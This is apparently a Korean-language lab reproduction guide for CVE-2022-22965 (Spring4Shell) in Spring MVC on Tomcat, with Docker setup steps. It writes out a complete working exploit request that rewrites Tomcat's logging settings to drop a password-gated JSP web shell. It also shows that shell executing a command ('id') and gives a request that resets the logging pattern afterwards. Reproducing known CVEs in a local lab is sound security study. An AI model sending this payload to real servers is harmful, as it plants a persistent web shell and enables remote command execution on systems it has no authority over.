# CVE-2022-22965

**Contributors**

-   [정다빈@ddddabi](https://github.com/ddddabi)

<br/>

### 요약
-   JDK 9+에서 실행되는 Spring MVC 또는 Spring WebFlux 응용 프로그램은 데이터 바인딩을 통해 원격 코드 실행(RCE)에 취약할 수 있음. 
-   이 특정 공격을 사용하려면 응용 프로그램이 WAR 배포로 Tomcat에서 실행되어야 함. 
-   응용 프로그램이 Spring Boot 실행 파일 jar, 즉 기본값으로 배포되면 이 공격에 취약하지 않음. 

References:

-  <https://tanzu.vmware.com/security/cve-2022-22965>
-  <https://www.lunasec.io/docs/blog/spring-rce-vulnerabilities/>

### 환경 구성 및 실행
**1.  Spring WebMVC 5.3.17을 사용하는 서버를 시작하려면 다음 명령을 실행함**

```
docker compose up -d
```

서버가 시작된 후 `http://your-ip:8080/?name=Bob&age=25`를 검색하면 예시 페이지가 나타납니다.

**2.  Apache Tomcat에서 로깅 구성을 변경하려면 다음 요청을 보내고 로그를 JSP 파일로 씀**

```
GET /?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat= HTTP/1.1
Host: localhost:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close
suffix: %>//
c1: Runtime
c2: <%
DNT: 1


```

![](1.png)

**3. JSP 웹쉘을 사용하여 임의 명령을 성공적으로 실행할 수 있음**

```
http://localhost:8080/tomcatwar.jsp?pwd=j&cmd=id
```

![](2.png)

**4. `class.module.classLoader.resources.context.parent.pipeline.first.pattern` 모든 요청 로깅이 해당 파일에 기록되기 때문에 JSP 웹셸이 커지는 것을 원하지 않으면 이 파일을 지워야 함 . 속성을 지우려면 다음 요청을 보냄**

```
GET /?class.module.classLoader.resources.context.parent.pipeline.first.pattern= HTTP/1.1
Host: localhost:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close


```
